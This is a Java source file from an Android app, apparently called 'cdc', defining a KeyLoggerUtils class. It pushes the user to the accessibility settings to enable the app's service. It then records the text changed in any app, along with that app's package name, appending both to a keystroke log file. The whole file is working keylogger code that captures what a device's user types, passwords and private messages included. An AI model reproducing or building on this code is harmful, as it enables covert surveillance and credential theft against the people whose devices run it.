package com.vikasyadavnsit.cdc.utils;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;

import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.services.MyAccessibilityService;

import java.util.List;
import java.util.stream.Collectors;

public class KeyLoggerUtils {

    public static void startAccessibilitySettingIntent(Context context) {
        if (!isAccessibilityServiceEnabled(context, MyAccessibilityService.class)) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            context.startActivity(intent);
        }
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends android.accessibilityservice.AccessibilityService> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        for (AccessibilityServiceInfo enabledService : enabledServices) {
            if (enabledService.getId().equals(context.getPackageName() + "/" + service.getName())) {
                return true;
            }
        }
        return false;
    }

    public static void processTextChangedEvent(AccessibilityEvent event) {
        String changedText = event.getText().stream().collect(Collectors.joining());
        if (!TextUtils.isEmpty(changedText)) {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
            FileUtils.appendDataToFile(FileMap.KEYSTROKE, "Package :" + packageName + " Text :" + changedText);
        }
    }

}
